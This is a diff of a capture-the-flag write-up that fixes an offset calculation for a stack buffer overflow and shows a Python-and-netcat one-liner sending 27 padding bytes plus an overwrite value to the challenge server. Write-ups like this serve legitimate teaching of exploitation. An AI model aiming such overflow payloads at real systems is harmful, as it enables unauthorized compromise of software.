@@ -60,7 +60,7 @@ How can we know the length of the string we must provide? By knowing where the v
 So finally, how many bytes do we need to start writting **local_ch**?
 Easy!
 
-`($ebp - 0x27) - ($ebp - 0xC) = 0x27 - 0xC = 0x1B = 27d` 27 Characters.
+`($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d` 27 Characters.
 
 ```bash
 $ python -c 'print("A"*27 + "\x1E\xAB\x11\xCA")' | nc pwn.ctf.tamu.edu 4322
